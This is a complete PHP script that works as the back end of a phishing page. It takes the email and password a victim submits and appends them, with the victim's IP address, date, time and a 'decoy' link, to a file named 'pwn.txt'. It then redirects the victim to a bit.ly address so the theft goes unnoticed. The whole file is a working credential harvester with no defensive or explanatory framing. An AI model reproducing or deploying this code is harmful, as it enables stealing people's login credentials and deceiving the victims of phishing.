<?php
	if ($_SERVER["REQUEST_METHOD"] == "POST") {
		date_default_timezone_set("America/New_York");
		$email = $_POST["email"];
		$password = $_POST["password"];
		$hashID = $_POST["hashID"];
		if ($hashID == "") {$hashID = "2jGfTPQ";}
		$file = fopen("pwn.txt", "a");
		fwrite($file, "\r\n");
    fwrite($file, "Email: " . $email);
		fwrite($file, "\r\n");
    fwrite($file, "Password: " . $password);
    fwrite($file, "\r\n");
    fwrite($file, "I.P. Address: " . getUserIP());
		fwrite($file, "\r\n");
		fwrite($file, "Date: " . date("F jS, Y"));
		fwrite($file, "\r\n");
		fwrite($file, "Time: " . date("h:i:sa"));
		fwrite($file, "\r\n");
		fwrite($file, "Decoy URL: http://bit.ly/$hashID");
    fwrite($file, "\r\n\n");
		fclose($file);
		header("Location: http://bit.ly/$hashID");
		exit;
		}
	function getUserIP() {
		$client  = @$_SERVER['HTTP_CLIENT_IP'];
		$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
		$remote  = $_SERVER['REMOTE_ADDR'];
		if (filter_var($client, FILTER_VALIDATE_IP)) {$ip = $client;}
		elseif (filter_var($forward, FILTER_VALIDATE_IP)) {$ip = $forward;}
		else {$ip = $remote;}
		return $ip;
	}
?>
